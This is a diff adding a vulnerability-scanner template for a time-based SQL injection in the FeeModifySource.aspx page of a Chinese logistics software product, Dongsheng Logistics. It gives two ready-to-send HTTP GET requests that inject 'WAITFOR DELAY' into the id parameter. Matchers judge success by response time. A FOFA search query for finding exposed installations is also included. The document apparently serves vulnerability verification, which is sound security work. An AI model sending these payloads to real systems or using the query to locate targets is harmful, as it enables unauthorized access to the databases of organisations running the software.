@@ -1,0 +1,37 @@
+## id: VEID-2026-11105
+## name: 东胜物流软件 FeeModifySource.aspx SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 东胜物流软件 FeeModifySource.aspx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 东胜物流软件
+## fofa-query: app="东胜物流软件-物流软件"
+## verification: true
+
+
+
+GET /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 5
+#@ matcher: status_code == 200
+
+---
+
+GET /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: body contains '<?xml version="1.0"'
+#@ matcher: status_code == 200
+
+
+# @VEIL-STAMP: a597ad83691ac2f66fce221e0875f1d49da72040c8b3f3fd7610c88d8aee30f3
